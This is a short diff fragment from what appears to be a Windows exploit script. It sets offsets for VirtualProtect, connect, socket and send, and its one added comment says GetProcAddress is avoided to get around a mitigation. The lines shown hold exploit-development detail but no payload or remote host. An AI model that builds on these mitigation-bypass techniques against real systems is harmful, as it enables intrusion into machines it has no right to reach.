@@ -74,7 +74,7 @@ safe_stack_spot = base + 0x2BF80 # (somewhere safe we can put the stack MUST BE 
 imp_send = base + 0x1C2D8
 
 # these offsets may vary from system-to-system
-
+# note: AVOIDING GetProcAddress since it seems to have some mitigation bullshit nowadays that fucks with us if the caller address is fucked up, so just do everything with static offsets like a dumbass
 virtualprotect_offset = 0x1B680  # rva of VirtualProtect in kernel32.dll
 connect_offset = 0x11600 # offset of connect in ws2_32.dll
 socket_offset = 0x5700 # offset of socket in ws2_32.dll
